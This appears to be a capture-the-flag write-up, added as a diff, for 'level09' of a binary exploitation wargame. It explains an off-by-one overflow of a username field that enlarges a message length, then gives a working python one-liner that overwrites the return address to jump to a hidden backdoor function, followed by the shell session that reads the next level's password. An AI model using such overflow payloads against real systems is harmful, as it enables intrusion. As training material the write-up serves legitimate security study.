@@ -1,0 +1,33 @@
+The program is a mess of asm code, with strange offsets from rbp and others strange things (in our point of view).
+The logic is rather simple: we are prompt for a username and a message to send. those 2 strings are stored in a struct.
+Their is also an uncalled function that read stdin and call system with that result.
+
+in more details:
+typedef struct	s_user
+{
+	char	msg[140];
+	char	name[40];
+	int		len;
+}				t_user;
+
+name is the username. When we are filling it, we can overflow by 1 bytes in order to rewrite len.
+len is the length of msg.
+msg is our buffer overflow door: by changing len to a value above 140, we can overflow the buffer.
+
+
+Our payload is rather simple: change the eip stored above handle_msg() stack frame, and change it to the address of secret_backdoor().
+
+level09@OverRide:~$ (python -c "print 'a'*40 + '\xd0' + '\n' + 'a' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n' + 'sh'"; cat) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
+>>: >: Msg sent!
+whoami
+end
+cd ../end
+cat .pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+cat end
+GG !
